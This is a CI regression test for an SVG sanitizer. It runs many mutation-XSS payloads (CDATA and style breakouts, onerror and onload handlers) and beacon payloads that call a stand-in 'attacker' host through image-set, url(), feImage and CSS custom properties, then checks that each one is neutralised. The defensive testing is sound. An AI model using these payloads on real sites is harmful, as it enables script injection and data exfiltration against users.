/**
 * SVG mutation-XSS round-trip regression test (CI-gated).
 *
 * Why this exists: the in-browser uitest battery at part-uitest.jsx covers
 * sanitizeSvgMarkup, but those tests run only when a user opens the test
 * panel and were NOT gated by `python3 tests/test_vela.py`. The Python
 * source-string checks at test_vela.py:227-231 verified that the right
 * code *existed* but not that the code path actually neutralized payloads
 * — exactly how the v12.54 `<style>` CDATA mXSS shipped: the line
 * `nodeType !== 1 && child.nodeType !== 3` was present but the walk's
 * <style> early-return prevented it from ever running on CDATA children.
 *
 * This script loads the REAL sanitizer from app/parts/part-imports.jsx,
 * runs each payload through the full round-trip (sanitize → re-parse as
 * HTML exactly like dangerouslySetInnerHTML), and asserts no live event
 * handler / script / suspicious tag materializes. It is invoked by
 * test_vela.py and the CI workflow, so a regression fails CI.
 *
 * Usage:
 *   node tests/test_svg_mxss.cjs
 * Exit code 0 = all pass, 1 = at least one payload broke out.
 */

const fs = require("fs");
const path = require("path");

let JSDOM;
try {
  JSDOM = require("jsdom").JSDOM;
} catch (e) {
  // Try /tmp/node_modules (local dev fallback)
  try { JSDOM = require("/tmp/node_modules/jsdom").JSDOM; }
  catch (_) {
    console.error("jsdom not installed. CI installs it; locally run: npm i jsdom");
    process.exit(2);
  }
}

const REPO = path.resolve(__dirname, "..");
// An explicit CLI arg (argv[2]) lets the guard self-test point this suite at a
// mutated copy (e.g. one carrying a decoy sanitizer) to prove the exactly-one check
// is load-bearing. It is deliberately NOT an environment variable: the real
// CI-gating run (`node tests/test_svg_mxss.cjs`, no arg) must always read the real
// source and cannot be redirected by ambient env (a leftover export / workflow env
// / .env would otherwise mask a broken sanitizer).
const SRC = process.argv[2] || path.join(REPO, "src/parts/part-imports.jsx");
const source = fs.readFileSync(SRC, "utf8");

// Extract each sanitizer construct and require EXACTLY ONE definition. Zero =>
// removed/reshaped; more than one => a decoy/duplicate is present (an attacker adds
// a clean copy — even inside a /* */ comment — so a first-match extraction tests the
// decoy while the REAL function re-admits <style>). The count is taken over the whole
// raw source, so a decoy anywhere (commented or not) trips it. Either way FAIL (exit
// 3, NOT the jsdom-missing "skip" code 2) so the suite always tests the real, sole
// sanitizer. Verified: the real source has exactly one of each construct.
function extractOne(re, label) {
  const all = source.match(new RegExp(re.source, re.flags.replace("g", "") + "g"));
  if (!all || all.length === 0) {
    console.error(`FAIL: could not locate ${label} (removed or reshaped).`);
    process.exit(3);
  }
  if (all.length > 1) {
    console.error(`FAIL: ${all.length} definitions of ${label} found (decoy/duplicate?).`);
    process.exit(3);
  }
  return [all[0]];
}

// Extract SVG_ALLOWED_TAGS + isSvgStyleSafe + sanitizeSvgMarkup, evaluate them in a
// jsdom window so DOMParser/document mirror the artifact.
const schemeMatch = extractOne(/const CSS_FETCH_SCHEME = .+;/, "CSS_FETCH_SCHEME");
const allowedMatch = extractOne(/const SVG_ALLOWED_TAGS = new Set\(\[[\s\S]*?\]\);/, "SVG_ALLOWED_TAGS");
const refAttrsMatch = extractOne(/const SVG_URL_REF_ATTRS = new Set\(\[[\s\S]*?\]\);/, "SVG_URL_REF_ATTRS");
const stylePropsMatch = extractOne(/const SVG_STYLE_PROPS = new Set\(\[[\s\S]*?\]\);/, "SVG_STYLE_PROPS");
const paintKeyMatch = extractOne(/const CSS_PAINT_KEY = .+;/, "CSS_PAINT_KEY");
const keyStemMatch = extractOne(/const cssKeyStem = .+;/, "cssKeyStem");
const isSafeMatch  = extractOne(/function isSvgStyleSafe\(css\) \{[\s\S]*?\n\}/, "isSvgStyleSafe");
const isInlineSafeMatch = extractOne(/function isSvgInlineStyleSafe\(css\) \{[\s\S]*?\n\}/, "isSvgInlineStyleSafe");
const sanitizeMatch = extractOne(/function sanitizeSvgMarkup\(raw\) \{[\s\S]*?\n\}/, "sanitizeSvgMarkup");

const dom = new JSDOM("<!DOCTYPE html><html><body></body></html>");
const ctx = {
  DOMParser: dom.window.DOMParser,
  document: dom.window.document,
  window: dom.window,
  console,
};
// Wrap and evaluate the extracted code in the jsdom context
const harness = `
${schemeMatch[0]}
${allowedMatch[0]}
${refAttrsMatch[0]}
${stylePropsMatch[0]}
${paintKeyMatch[0]}
${keyStemMatch[0]}
${isSafeMatch[0]}
${isInlineSafeMatch[0]}
${sanitizeMatch[0]}
module.exports = { SVG_ALLOWED_TAGS, SVG_URL_REF_ATTRS, isSvgStyleSafe, isSvgInlineStyleSafe, sanitizeSvgMarkup };
`;
const vm = require("vm");
const sandbox = { ...ctx, module: { exports: {} }, exports: {}, require };
vm.createContext(sandbox);
vm.runInContext(harness, sandbox);
const { sanitizeSvgMarkup, isSvgStyleSafe } = sandbox.module.exports;

// Harness liveness check. sanitizeSvgMarkup swallows every exception and returns
// "" — correct at runtime (fail closed), but it means a harness that forgot to
// extract a helper the sanitizer now depends on makes EVERY negative assertion
// below pass vacuously against an always-empty sanitizer. Prove the real code path
// executes before trusting a single "no leak" result.
{
  const probe = sanitizeSvgMarkup('<rect width="10" height="10" fill="url(#g)"/>');
  if (!/<rect[^>]*fill="url\(#g\)"/.test(probe)) {
    console.error("FAIL: harness is not exercising the real sanitizer (benign payload -> " +
      JSON.stringify(probe) + "). A helper is missing from the extraction list above.");
    process.exit(3);
  }
}

let passed = 0, failed = 0;
const document = dom.window.document;

function isDangerous(html) {
  // Re-parse exactly like dangerouslySetInnerHTML
  const d = document.createElement("div");
  d.innerHTML = html;
  if (d.querySelector("script")) return "script tag materialized";
  // Any element carrying an on* attribute = live event handler = breakout
  const els = d.querySelectorAll("*");
  for (const el of els) {
    for (const a of Array.from(el.attributes || [])) {
      if (/^on/i.test(a.name)) return `${el.tagName}.${a.name}=${a.value}`;
    }
  }
  // <img src=x> with no onerror is harmless (no handler), but if src is a
  // javascript: scheme that's broken too — we already block those above by
  // attribute walk; nonetheless guard against it.
  const badSrc = Array.from(d.querySelectorAll("[src]")).find(el => {
    const s = (el.getAttribute("src") || "").replace(/[\x00-\x20]+/g, "").toLowerCase();
    return s.startsWith("javascript:") || s.startsWith("vbscript:");
  });
  if (badSrc) return `${badSrc.tagName} has dangerous src`;
  return null;
}

function run(name, payload) {
  const out = sanitizeSvgMarkup(payload);
  const danger = isDangerous(out);
  if (danger) {
    failed++;
    console.log(`  ❌ ${name}`);
    console.log(`     payload : ${payload}`);
    console.log(`     out     : ${out}`);
    console.log(`     leak    : ${danger}`);
  } else {
    passed++;
    console.log(`  ✅ ${name}`);
  }
}

console.log("── SVG mXSS round-trip suite ──");

// 1. Original v12.45 fix: CDATA at top level of SVG
run("CDATA at SVG root smuggling <img onerror>",
    "<![CDATA[<img src=x onerror=alert(1)>]]>");

// 2. v12.54 fix: CDATA inside <style> (the headline bug)
run("CDATA inside <style> (v12.54 fix)",
    "<style>x{}<![CDATA[</style><img src=x onerror=alert(1)>]]></style>");

// 3. Layered: CDATA inside nested <g><style>
run("CDATA inside nested <g><style>",
    "<g><style>.n{fill:red}<![CDATA[</style><img src=x onerror=alert(1)>]]></style></g>");

// 4. CDATA inside <style> with text outside CDATA (mixed content)
run("Mixed text + CDATA inside <style>",
    "<style>.a{} <![CDATA[</style><svg onload=alert(1)>]]> .b{}</style>");

// 5. CDATA inside <title>, <text>, <desc> — already handled by walk descent
run("CDATA inside <title>",
    "<title><![CDATA[</title><img src=x onerror=alert(1)>]]></title>");
run("CDATA inside <text>",
    "<text><![CDATA[</text><img src=x onerror=alert(1)>]]></text>");
run("CDATA inside <desc>",
    "<desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc>");

// 5b. Event handler on <style> — <style> is a common SVG/HTML element, so a
// surviving on* handler goes live on the HTML re-parse. Bare, and nested in the
// desc/title HTML integration points (the classic namespace-confusion setup).
run("<style onload> handler stripped (bare)",
    '<style onload="alert(1)">.a{fill:#000}</style>');
run("<style onload> nested in <desc> (mXSS namespace confusion)",
    '<desc><style onload="alert(1)">x</style></desc>');
run("<style onload> nested in <title> (mXSS namespace confusion)",
    '<title><style onload="alert(1)">x</style></title>');
run("<style onload> nested in <g> (mXSS)",
    '<g><style onload="alert(1)">x</style></g>');
// 5c. Handler on other <style>-adjacent elements re-parsed as HTML — the output
// backstop must reject any element that carries a handler post-reparse.
run("mixed handlers across style/desc/g stripped",
    '<desc><style onclick="a()">x</style></desc><g onload="b()"><rect onmouseover="c()"/></g>');

// 6. <style> CSS-text containing '<' should be rejected wholesale (defense-in-depth)
run("isSvgStyleSafe rejects '<' (defense-in-depth)",
    "<style>x { color: red; } /* &lt;img&gt; */</style>");

// 7. <style> CSS-text containing ']]>' should be rejected (defense-in-depth)
run("isSvgStyleSafe rejects ']]>' (defense-in-depth)",
    "<style>x { color: red; } /* ]]&gt; */</style>");

// 8. Rawtext-family elements: should all be removed outright now
const rawtextFamily = ["xmp", "noembed", "noframes", "noscript", "plaintext", "listing"];
for (const tag of rawtextFamily) {
  run(`<${tag}> removed (rawtext-family blocklist)`,
      `<${tag}>X &lt;/${tag}&gt;&lt;img src=x onerror=alert(1)&gt;</${tag}>`);
  run(`<${tag}> CDATA breakout (rawtext-family blocklist)`,
      `<${tag}><![CDATA[</${tag}><img src=x onerror=alert(1)>]]></${tag}>`);
}

// 9. Comment node smuggling (pre-existing v12.45 case)
run("Comment node smuggling neutralized",
    "<!--<img src=x onerror=alert(1)>-->");

// 10. Processing instruction smuggling
run("PI node smuggling neutralized",
    "<?xml-stylesheet href='javascript:alert(1)'?>");

// 11. The <style> ELEMENT is document-global CSS (UI-redress/clickjack of real
// controls) and must be dropped outright; the shape element still survives so
// geometry renders. Deck paint uses presentation attributes, not a stylesheet.
const legitOut = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
if (!/<style[\s>]/i.test(legitOut) && !/#3b82f6/.test(legitOut) && /<rect[^>]*class="node"/i.test(legitOut)) {
  passed++; console.log("  ✅ <style> element stripped; shape element preserved");
} else {
  failed++; console.log("  ❌ <style> element stripped — output:", legitOut);
}

// 12. Paint-server refs survive on PRESENTATION ATTRIBUTES (the element-local,
// non-cascade-global path); a <style> element is not needed and not allowed.
const fragOut = sanitizeSvgMarkup('<rect fill="url(#grad1)" marker-end="url(#mark)"/>');
if (/url\(#grad1\)/.test(fragOut) && /url\(#mark\)/.test(fragOut)) {
  passed++; console.log("  ✅ url(#fragment) paint refs preserved on presentation attrs");
} else {
  failed++; console.log("  ❌ url(#fragment) refs preserved — output:", fragOut);
}

// 13. UI-integrity: a <style> whose selector targets app chrome must be dropped
// so it can never reach the trusted UI cascade (S16/S17 redress+clickjack family).
const redressOut = sanitizeSvgMarkup('<style>button[title^="Delete slide"]{position:fixed;opacity:0}</style><rect width="10" height="10"/>');
// Negatives: the <style>, its chrome selector, and the declaration are all gone.
// Positive control (/<rect/): the benign element survived, so a PASS can't come
// from an always-empty sanitizer returning "" (guards against a false pass).
if (!/<style[\s>]/i.test(redressOut) && !/Delete slide/.test(redressOut) &&
    !/position:fixed/.test(redressOut) && /<rect/i.test(redressOut)) {
  passed++; console.log("  ✅ chrome-targeting <style> dropped; benign element preserved");
} else {
  failed++; console.log("  ❌ chrome-targeting <style> dropped — output:", redressOut);
}

// 14. UI-integrity: an inline style="" carrying layout/positioning (position:fixed,
// inset, z-index, viewport-sizing, pointer-events) must be stripped — otherwise an SVG
// element in a non-clipped diagram sink (study-notes / teacher panel) becomes a
// full-viewport overlay/clickjack of app chrome. The element survives; only the
// dangerous style is dropped.
const overlayOut = sanitizeSvgMarkup('<rect fill="red" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;pointer-events:none"/>');
if (!/position\s*:/i.test(overlayOut) && !/z-index/i.test(overlayOut) && !/100vw/i.test(overlayOut) &&
    !/pointer-events/i.test(overlayOut) && /<rect/i.test(overlayOut) && /fill="red"/.test(overlayOut)) {
  passed++; console.log("  ✅ inline style layout/position stripped; paint attrs preserved");
} else {
  failed++; console.log("  ❌ inline style overlay not neutralized — output:", overlayOut);
}

// ── v12.59: network auto-load invariant ──────────────────────────────────
// Principle: rendering a deck makes ZERO network requests. After sanitization
// no external reference of ANY kind may survive. Anything that resolves to a
// non-fragment URL — url(http…), a string-source image function, an external
// href/src, or a non-image data: — is a leak. url(#fragment) and click-only
// <a href="https://…"> are the ONLY URL forms allowed and are asserted to
// survive separately below.
function hasNetworkRef(html) {
  const low = String(html).toLowerCase();
  // any url() that is not a same-document fragment
  for (const m of low.match(/url\s*\([^)]*\)/g) || []) {
    if (!/^url\s*\(\s*['"]?\s*#/.test(m)) return `external url(): ${m}`;
  }
  // string-source image functions (image-set/image/cross-fade/src/-webkit-*)
  if (/(?:-webkit-|-moz-)?(?:image-set|image|cross-fade|src)\s*\(\s*['"]/.test(low)) return "string-source image function";
  // any href/xlink:href/src that isn't a #fragment (anchors handled in the survives test)
  const d = document.createElement("div"); d.innerHTML = html;
  for (const el of d.querySelectorAll("*")) {
    const tag = el.tagName.toLowerCase();
    for (const a of Array.from(el.attributes || [])) {
      const n = a.name.toLowerCase(), v = (a.value || "").trim().toLowerCase();
      if ((n === "href" || n === "xlink:href") && tag !== "a" && !v.startsWith("#")) return `${tag}.${n}=${a.value}`;
      if (n === "src" && !/^data:image\//.test(v)) return `${tag}.src=${a.value}`;
    }
  }
  return null;
}

function runNet(name, payload) {
  const out = sanitizeSvgMarkup(payload);
  const leak = hasNetworkRef(out);
  if (leak) {
    failed++;
    console.log(`  ❌ ${name}`);
    console.log(`     payload : ${payload}`);
    console.log(`     out     : ${out}`);
    console.log(`     leak    : ${leak}`);
  } else {
    passed++;
    console.log(`  ✅ ${name}`);
  }
}

console.log("── SVG network auto-load suite (v12.59) ──");
// CSS string-source image functions inside <style> (the reported bypass)
runNet("image-set string source in <style>",
    '<style>[x^="V"]{background:image-set("https://attacker/b?p=V" 1x)}</style>');
runNet("-webkit-image-set in <style>",
    '<style>rect{background:-webkit-image-set("https://attacker/b" 1x)}</style>');
runNet("image() string source in <style>",
    '<style>rect{background:image("https://attacker/b")}</style>');
runNet("cross-fade() string source in <style>",
    '<style>rect{background:cross-fade(url(#a),"https://attacker/b",50%)}</style>');
runNet("CSS src() function in <style>",
    '<style>rect{background:src("https://attacker/b")}</style>');
runNet("external url() in <style> (v12.53 baseline)",
    '<style>rect{fill:url("https://attacker/b")}</style>');
// CSS in style="" attribute + presentation attributes
runNet("image-set in style= attribute",
    '<rect style="background:image-set(&quot;https://attacker/b&quot; 1x)"/>');
runNet("external url() in fill presentation attr",
    '<rect fill="url(https://attacker/b)"/>');
runNet("external url() in filter presentation attr",
    '<rect filter="url(https://attacker/b)"/>');
// Non-anchor href/xlink:href external auto-load
runNet("external <image href> beacon",
    '<image href="https://attacker/b.png"/>');
runNet("feImage external href (Roundcube class)",
    '<filter><feImage href="https://attacker/b.png"/></filter>');
runNet("feImage external xlink:href",
    '<filter><feImage xlink:href="https://attacker/b.png"/></filter>');
runNet("use external href",
    '<use href="https://attacker/b.svg#x"/>');
runNet("use data: same-origin bypass",
    '<use href="data:image/svg+xml,<svg/>#x"/>');
// v12.62: <image src>/<srcset> are inert in SVG (SVG uses href) but, when the
// sanitized markup is re-parsed in an HTML context, <image> aliases to <img> and
// these fire a zero-click external GET. Must be stripped AND output kept SVG-scoped.
runNet("external <image src> beacon (HTML-alias <img>)",
    '<image src="https://attacker/b.png?d=secret"/>');
runNet("external <image srcset> beacon",
    '<image srcset="https://attacker/b.png 1x"/>');
runNet("external <image src> beacon nested in <g>",
    '<g><image src="https://attacker/b.png"/></g>');
// Direct HTML-aliasing assertion: re-parse exactly like dangerouslySetInnerHTML and
// confirm no live <img> with an external src materializes from a bare <image>.
{
  const out = sanitizeSvgMarkup('<image src="https://attacker/b.png?d=secret"/>');
  const d = document.createElement("div"); d.innerHTML = out;
  const liveImg = Array.from(d.querySelectorAll("img")).find(
    (el) => !/^data:image\//.test((el.getAttribute("src") || "").toLowerCase()));
  if (!liveImg) {
    passed++; console.log("  ✅ bare <image src> does not HTML-alias to a fetching <img>");
  } else {
    failed++; console.log("  ❌ bare <image src> HTML-aliased to live <img> src=" + liveImg.getAttribute("src"));
  }
}

// ── v13.46: custom-property indirection + slashless authority ────────────
// Class: a lexical value filter reads the DECLARED text, but a CSS custom
// property is an untyped token bag substituted at computed-value time — after
// every such check has run — so an indirected value can re-assemble a fetching
// primitive the filter never saw. Second primitive: for special schemes the URL
// parser canonicalizes an authority written without its slashes, so a `//` scan
// alone does not mean "no absolute URL". Both are asserted on the inline style=""
// attribute, on url-ref presentation attributes, and across element boundaries
// (custom properties inherit, so the store and the load can sit on different
// elements). hasNetworkRef alone would not catch these — assert the primitives
// are gone from the output entirely.
function runNoVar(name, payload) {
  const out = sanitizeSvgMarkup(payload);
  const leak = /var\s*\(|--[a-z]|attacker\.invalid|image-set/i.test(out) || hasNetworkRef(out);
  if (leak) {
    failed++;
    console.log(`  ❌ ${name}`);
    console.log(`     payload : ${payload}`);
    console.log(`     out     : ${out}`);
  } else {
    passed++;
    console.log(`  ✅ ${name}`);
  }
}
console.log("── SVG CSS indirection / slashless-authority suite (v13.46) ──");
runNoVar("custom-property indirection in style= (image-set consumer)",
    `<rect style='--p:"https:attacker.invalid/b";background-image:image-set(var(--p) 1x)'/>`);
runNoVar("custom-property indirection on the deck's own root <svg>",
    `<svg xmlns="http://www.w3.org/2000/svg" style='--p:"https:attacker.invalid/b";background-image:image-set(var(--p) 1x)'><rect/></svg>`);
runNoVar("custom property inherited across elements (store on <g>, load on child)",
    `<g style='--p:"https:attacker.invalid/b"'><rect style="background-image:image-set(var(--p) 1x)"/></g>`);
runNoVar("custom-property indirection into mask-image",
    `<rect style='--p:"https:attacker.invalid/b";mask-image:image-set(var(--p) 1x)'/>`);
runNoVar("custom-property indirection on a url-ref presentation attr",
    `<rect style='--p:"https:attacker.invalid/b"' fill="image-set(var(--p))"/>`);
runNoVar("var() into url() on a presentation attr",
    `<rect style='--p:"https:attacker.invalid/b"' filter="url(var(--p))"/>`);
// attr() is the same class as var(): late binding, and it reads a DOM attribute
// this sanitizer preserves verbatim, so the URL never appears in the CSS text at
// all. env() resolves at the same stage. The whole family is rejected, not just
// the one function that shipped a bug.
// A data-* attribute may legitimately CONTAIN a URL as inert text — it is only a
// leak if something dereferences it, which is precisely what attr() would do. So
// assert the dereference is gone, not that the string is absent.
{
  const cases = [
    ['<rect data-u="https://attacker.invalid/b" style="fill:attr(data-u url)"/>', "style"],
    ['<rect data-u="url(https://attacker.invalid/b)" fill="attr(data-u)"/>', "fill"],
  ];
  // (hasNetworkRef is not usable here: it scans raw text and would flag a URL
  // sitting inert inside the data-* value itself. What matters is that the
  // dereferencing construct and the attribute that would apply it are gone.)
  const leaked = cases.filter(([payload, attr]) => {
    const out = sanitizeSvgMarkup(payload);
    return /attr\s*\(/i.test(out) || new RegExp(`\\s${attr}=`, "i").test(out);
  });
  if (leaked.length === 0) { passed++; console.log("  ✅ attr() dereference of a preserved data-* attribute removed"); }
  else { failed++; console.log("  ❌ attr() dereference survived: " + JSON.stringify(leaked.map((c) => sanitizeSvgMarkup(c[0])))); }
}
runNoVar("env() indirection into an image source",
    `<rect style="background-image:image-set(env(x) 1x)"/>`);
// These two carry a slashless authority in a shape that the url()-token and
// function-name+quote rules ALREADY reject, so they pin the invariant but not the
// scheme guard specifically…
runNoVar("slashless authority, no indirection (url-token)",
    `<rect style="background-image:url(https:attacker.invalid/b)" fill="url(https:attacker.invalid/p)"/>`);
runNoVar("slashless authority in a quoted string source",
    `<rect style='background-image:image-set("https:attacker.invalid/b" 1x)'/>`);
// …whereas these present a bare, UNQUOTED scheme with no url() token: nothing but
// the scheme reject sees them, so they are what make it load-bearing.
runNoVar("bare unquoted scheme, no url() token and no quote",
    `<rect fill="image-set(https:attacker.invalid/x)" stroke="src(https:attacker.invalid/y)"/>`);
runNoVar("bare unquoted scheme in an inline-style value",
    `<rect style="fill:image-set(https:attacker.invalid/x 1x)"/>`);

// Property allowlist: style="" is a declaration LIST, so the PROPERTY half is
// governed too — an image-loading property is rejected on its name alone, before
// any value cleverness. Rejection is whole-attribute (fail closed).
{
  const cases = [
    ['<rect fill="red" style="background-image:url(#a)"/>', "background-image"],
    ['<rect fill="red" style="mask-image:url(#a)"/>', "mask-image"],
    ['<rect fill="red" style="border-image:url(#a)"/>', "border-image"],
    ['<rect fill="red" style="offset-path:url(#a)"/>', "offset-path"],
    ['<rect fill="red" style="position:fixed;top:0;left:0"/>', "position (the real overlay escape)"],
  ];
  // Collect EVERY failing case: a single `bad` variable is overwritten by later
  // iterations and reports only the last one, which understates a regression.
  const bad = [];
  for (const [payload, label] of cases) {
    const out = sanitizeSvgMarkup(payload);
    if (/style=/i.test(out) || !/fill="red"/.test(out)) bad.push(`${label} -> ${out}`);
  }
  if (!bad.length) { passed++; console.log("  ✅ inline-style property allowlist rejects non-paint properties (element preserved)"); }
  else { failed++; console.log(`  ❌ inline-style property allowlist — ${bad.length}/${cases.length} failed:\n     ` + bad.join("\n     ")); }
}
// Positive control: real SVG paint/text declarations must still survive, or the
// allowlist above would be passing by rejecting everything.
{
  const out = sanitizeSvgMarkup('<text style="fill:#3b82f6;stroke-width:2;font-family:Inter,sans-serif;font-size:14px;text-anchor:middle;opacity:0.8">A</text>');
  const keeps = /fill:#3b82f6/.test(out) && /stroke-width:2/.test(out) &&
                /font-family:Inter/.test(out) && /text-anchor:middle/.test(out);
  if (keeps) { passed++; console.log("  ✅ legitimate paint/text inline style preserved (no false reject)"); }
  else { failed++; console.log("  ❌ legitimate inline style dropped — output: " + out); }
}
// Attributes named after a fetching CSS property are inert in browsers today but
// SVG 2 widens the presentation-attribute set, so they are value-gated ahead of
// time rather than left un-checked until a browser starts honouring them.
{
  const attrs = ["mask-image", "border-image", "border-image-source", "list-style-image",
                 "offset-path", "shape-outside", "background", "background-image", "backdrop-filter"];
  const leaked = attrs.filter((a) =>
    /attacker\.invalid/i.test(sanitizeSvgMarkup(`<rect ${a}="url(https://attacker.invalid/b)"/>`)));
  if (leaked.length === 0) { passed++; console.log("  ✅ CSS-image-named presentation attributes value-gated (forward-safe)"); }
  else { failed++; console.log("  ❌ un-gated fetching attribute: " + JSON.stringify(leaked)); }
}
// …without disturbing the real SVG attributes whose names share those stems.
{
  const out = sanitizeSvgMarkup('<mask maskUnits="userSpaceOnUse" maskContentUnits="userSpaceOnUse"><rect width="10" height="10"/></mask>');
  const keeps = /maskUnits="userSpaceOnUse"/i.test(out) && /maskContentUnits="userSpaceOnUse"/i.test(out);
  if (keeps) { passed++; console.log("  ✅ real SVG attributes sharing a paint-key stem preserved (maskUnits/…)"); }
  else { failed++; console.log("  ❌ legit SVG attribute dropped — output: " + out); }
}
// A `--` inside a same-document fragment id is ordinary naming, not a custom
// property: the store can only be introduced at the start of a declaration, so
// the reject is anchored there and these must survive on BOTH gates (the
// presentation-attribute path and the inline-style path).
{
  const out = sanitizeSvgMarkup('<rect fill="url(#grad--blue)" clip-path="url(#clip--1)" style="stroke:url(#s--2)"/>');
  const keeps = /url\(#grad--blue\)/.test(out) && /url\(#clip--1\)/.test(out) && /url\(#s--2\)/.test(out);
  if (keeps) { passed++; console.log("  ✅ double-hyphen fragment ids preserved (custom-property reject is declaration-anchored)"); }
  else { failed++; console.log("  ❌ double-hyphen fragment id dropped — output: " + out); }
}
// …while the declaration form stays rejected wherever it can appear.
{
  const forms = ['--p:red', 'fill:red;--p:red', 'fill:red; --p:red', '  --p:red'];
  const leaked = forms.filter((v) => isSvgStyleSafe(v));
  if (leaked.length === 0) { passed++; console.log("  ✅ custom-property declaration rejected in every position"); }
  else { failed++; console.log("  ❌ custom-property declaration accepted — " + JSON.stringify(leaked)); }
}
// Text/geometry properties real diagram SVG uses must not be collateral damage of
// the property allowlist (rejection is whole-attribute, so one miss blanks it all).
{
  const out = sanitizeSvgMarkup('<text style="fill:#fff;text-transform:uppercase;text-shadow:0 1px 2px #000;line-height:1.4;cursor:pointer">A</text>');
  const keeps = /text-transform:uppercase/.test(out) && /text-shadow/.test(out) && /cursor:pointer/.test(out);
  if (keeps) { passed++; console.log("  ✅ common text/interaction properties allowlisted (no whole-attribute loss)"); }
  else { failed++; console.log("  ❌ legitimate text properties dropped — output: " + out); }
}
{
  const out = sanitizeSvgMarkup('<rect style="fill:url(#grad);clip-path:url(#c);mask:url(#m);filter:url(#f)"/>');
  const keeps = /url\(#grad\)/.test(out) && /url\(#c\)/.test(out) && /url\(#m\)/.test(out) && /url\(#f\)/.test(out);
  if (keeps) { passed++; console.log("  ✅ same-document url(#fragment) refs preserved in inline style"); }
  else { failed++; console.log("  ❌ inline-style fragment refs dropped — output: " + out); }
}

// Positive: legitimate same-document refs + click links must survive
// (NB: <use> is intentionally absent from SVG_ALLOWED_TAGS — cross-doc ref XSS,
// Cure53 #283 — so a #fragment ref is asserted on allowed elements only.)
const keepRef = sanitizeSvgMarkup('<rect fill="url(#grad)" filter="url(#blur)" clip-path="url(#c)"/>');
if (/url\(#grad\)/.test(keepRef) && /url\(#blur\)/.test(keepRef) && /url\(#c\)/.test(keepRef)) {
  passed++; console.log("  ✅ url(#fragment) paint/filter/clip-path refs preserved");
} else { failed++; console.log("  ❌ fragment refs preserved — output:", keepRef); }

const keepLink = sanitizeSvgMarkup('<a href="https://example.com/x"><text>hi</text></a>');
if (/href="https:\/\/example\.com\/x"/.test(keepLink)) {
  passed++; console.log("  ✅ <a> click link (https) preserved");
} else { failed++; console.log("  ❌ <a> click link preserved — output:", keepLink); }

const keepImg = sanitizeSvgMarkup('<image href="#sym"/>');
if (/href="#sym"/.test(keepImg)) {
  passed++; console.log("  ✅ <image href=#fragment> preserved");
} else { failed++; console.log("  ❌ <image href=#fragment> preserved — output:", keepImg); }

console.log(`\n  ${passed} passed, ${failed} failed`);
process.exit(failed === 0 ? 0 : 1);
